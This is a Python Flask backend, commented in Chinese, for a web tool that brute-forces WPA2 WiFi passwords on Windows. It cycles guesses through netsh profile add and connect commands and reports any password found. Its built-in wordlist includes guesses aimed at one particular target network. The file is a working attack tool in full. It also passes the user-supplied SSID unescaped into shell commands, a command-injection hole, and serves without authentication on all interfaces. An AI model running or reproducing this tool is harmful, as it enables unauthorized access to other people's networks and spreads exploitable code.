#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WiFi 密码破解 — Web GUI 后端
Flask + SSE 实现实时进度推送，移动端友好的 Web 界面
"""

import subprocess
import sys
import os
import time
import json
import threading
import tempfile
from flask import Flask, render_template, request, Response, jsonify

app = Flask(__name__)

# ─── 全局状态（线程安全） ────────────────────────────────────────────

state_lock = threading.Lock()

crack_state = {
    "running": False,       # 是否正在破解
    "ssid": "",             # 目标 SSID
    "current_password": "", # 当前尝试的密码
    "tried": 0,             # 已尝试数量
    "total": 0,             # 总密码数
    "result": None,         # 结果: {"found": True/False, "password": "..."}
    "log": [],              # 日志消息列表
}


def emit_log(msg: str):
    """添加一条日志"""
    with state_lock:
        crack_state["log"].append({
            "time": time.strftime("%H:%M:%S"),
            "msg": msg
        })


def reset_state():
    """重置破解状态"""
    with state_lock:
        crack_state["running"] = False
        crack_state["ssid"] = ""
        crack_state["current_password"] = ""
        crack_state["tried"] = 0
        crack_state["total"] = 0
        crack_state["result"] = None
        crack_state["log"] = []


# ─── netsh 命令封装 ──────────────────────────────────────────────────

def run_netsh(cmd: str) -> str:
    """执行 netsh 命令并返回输出（防乱码）"""
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=30,
            encoding="utf-8", errors="ignore"
        )
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return "TIMEOUT"
    except Exception as e:
        return str(e)


def delete_profile(ssid: str):
    run_netsh(f'netsh wlan delete profile name="{ssid}"')


def add_profile(ssid: str, password: str):
    """添加 WiFi 配置文件（XML 写入临时目录）"""
    xml = f"""<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID>
            <name>{ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>manual</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""
    tmpdir = tempfile.gettempdir()
    xml_path = os.path.join(tmpdir, f"wifi_crack_{ssid}.xml")
    with open(xml_path, "w", encoding="utf-8") as f:
        f.write(xml)
    output = run_netsh(f'netsh wlan add profile filename="{xml_path}"')
    try:
        os.remove(xml_path)
    except Exception:
        pass
    return output


def try_connect(ssid: str):
    return run_netsh(f'netsh wlan connect name="{ssid}"')


def check_connected(ssid: str) -> bool:
    """检查是否已连上目标 SSID"""
    out = run_netsh('netsh wlan show interfaces')
    current_ssid = None
    for line in out.split("\n"):
        if "SSID" in line and "BSSID" not in line:
            parts = line.split(":")
            if len(parts) > 1:
                current_ssid = parts[1].strip()
    return current_ssid == ssid


# ─── 密码字典生成 ────────────────────────────────────────────────────

def load_passwords(wordlist_path: str = None) -> list:
    """
    加载密码列表：优先用上传的字典文件，否则用内置常见密码
    """
    if wordlist_path and os.path.isfile(wordlist_path):
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
        return passwords

    # 内置常见密码（针对中国 WiFi 热点优化）
    return [
        "12345678", "88888888", "00000000", "11111111", "22222222",
        "33333333", "44444444", "55555555", "66666666", "77777777",
        "99999999", "123456789", "87654321", "11223344", "12341234",
        "abcd1234", "abc12345", "a1234567", "password", "admin123",
        "admin888", "qwertyuiop", "8888888888", "1234567890",
        "0000000000", "13800138000", "admin", "tplink", "123456789a",
        "welcome1", "iloveyou", "000000", "111111", "222222", "333333",
        "555555", "777777", "121212", "131313",
        # 针对 "2lou" 的猜测
        "2lou1234", "2lou8888", "2lou2024", "2lou2025", "2lou2026",
        "lou12345", "erluo888", "88886666", "16888888", "66668888",
        "wifi1234", "wifi8888", "12344321", "aabbccdd", "qweasdzxc",
        "1q2w3e4r", "@1234567", "Aa123456", "abc123456",
    ]


# ─── 破解主循环（在线程中运行） ──────────────────────────────────────

def crack_thread(ssid: str, wordlist_path: str = None):
    """
    破解主逻辑 — 在独立线程中运行，通过全局 state 与 SSE 通信
    """
    global crack_state

    passwords = load_passwords(wordlist_path)
    passwords = [p.strip() for p in passwords if len(p.strip()) >= 8]

    with state_lock:
        crack_state["running"] = True
        crack_state["ssid"] = ssid
        crack_state["total"] = len(passwords)
        crack_state["tried"] = 0
        crack_state["result"] = None

    emit_log(f"开始破解 '{ssid}'，共 {len(passwords)} 个密码")
    emit_log("断开当前 WiFi 连接...")
    run_netsh('netsh wlan disconnect')
    time.sleep(2)

    for i, pwd in enumerate(passwords):
        # 检查是否被用户手动停止
        with state_lock:
            if not crack_state["running"]:
                emit_log("用户手动停止")
                return

        pwd_clean = pwd.strip()
        with state_lock:
            crack_state["current_password"] = pwd_clean
            crack_state["tried"] = i + 1

        emit_log(f"[{i+1}/{len(passwords)}] 尝试: {pwd_clean}")

        # 删除旧配置 → 添加新配置 → 连接
        delete_profile(ssid)
        result = add_profile(ssid, pwd_clean)
        if "拒绝访问" in result:
            emit_log("❌ 权限不足，请以管理员身份运行！")
            with state_lock:
                crack_state["result"] = {"found": False, "password": None}
                crack_state["running"] = False
            return

        time.sleep(1)
        try_connect(ssid)
        time.sleep(4)  # 等待连接结果

        # 检查连接是否成功
        if check_connected(ssid):
            emit_log(f"🎉 密码已找到: {pwd_clean}")
            with state_lock:
                crack_state["result"] = {"found": True, "password": pwd_clean}
                crack_state["running"] = False

            # 保存结果
            try:
                with open(f"{ssid}_password.txt", "w", encoding="utf-8") as f:
                    f.write(f"SSID: {ssid}\nPassword: {pwd_clean}\n")
            except Exception:
                pass
            return

    # 全部尝试完毕仍未找到
    emit_log(f"已尝试全部 {len(passwords)} 个密码，未找到正确密码")
    with state_lock:
        crack_state["result"] = {"found": False, "password": None}
        crack_state["running"] = False


# ─── Flask 路由 ──────────────────────────────────────────────────────

@app.route("/")
def index():
    """首页 — 移动端优先的 Web 界面"""
    return render_template("index.html")


@app.route("/api/start", methods=["POST"])
def api_start():
    """启动破解"""
    data = request.get_json()
    ssid = data.get("ssid", "").strip()
    wordlist = data.get("wordlist", None)

    if not ssid:
        return jsonify({"error": "请输入 WiFi 名称 (SSID)"}), 400

    with state_lock:
        if crack_state["running"]:
            return jsonify({"error": "破解正在进行中，请先停止"}), 409

    reset_state()
    t = threading.Thread(target=crack_thread, args=(ssid, wordlist), daemon=True)
    t.start()
    return jsonify({"status": "started", "ssid": ssid})


@app.route("/api/stop", methods=["POST"])
def api_stop():
    """停止破解"""
    with state_lock:
        crack_state["running"] = False
    emit_log("停止请求已提交...")
    return jsonify({"status": "stopped"})


@app.route("/api/state")
def api_state():
    """获取当前状态（轮询用）"""
    with state_lock:
        return jsonify({
            "running": crack_state["running"],
            "ssid": crack_state["ssid"],
            "current_password": crack_state["current_password"],
            "tried": crack_state["tried"],
            "total": crack_state["total"],
            "result": crack_state["result"],
        })


@app.route("/api/stream")
def api_stream():
    """
    SSE 端点 — 实时推送进度事件
    前端用 EventSource 连接此端点
    """

    def event_generator():
        last_log_index = 0
        while True:
            with state_lock:
                running = crack_state["running"]
                logs = crack_state["log"][last_log_index:]
                last_log_index = len(crack_state["log"])
                result = crack_state["result"]
                tried = crack_state["tried"]
                total = crack_state["total"]
                current = crack_state["current_password"]

            # 推送新日志
            for log_entry in logs:
                yield f"data: {json.dumps({'type': 'log', **log_entry})}\n\n"

            # 推送进度
            yield f"data: {json.dumps({'type': 'progress', 'tried': tried, 'total': total, 'current': current})}\n\n"

            # 推送结果
            if result is not None:
                yield f"data: {json.dumps({'type': 'result', **result})}\n\n"
                yield "data: {\"type\": \"done\"}\n\n"
                return

            if not running and result is None:
                # 空闲状态
                yield f"data: {json.dumps({'type': 'idle'})}\n\n"

            time.sleep(0.5)

    return Response(
        event_generator(),
        mimetype="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "X-Accel-Buffering": "no",
            "Access-Control-Allow-Origin": "*",
        }
    )


# ─── 启动入口 ─────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("=" * 55)
    print("  WiFi 密码破解 Web GUI")
    print("  本机访问 : http://127.0.0.1:5000")
    print("  手机访问 : http://<本机IP>:5000（需同网络）")
    print("=" * 55)
    # host="0.0.0.0" 允许局域网内其他设备（手机）访问
    app.run(host="0.0.0.0", port=5000, debug=False, threaded=True)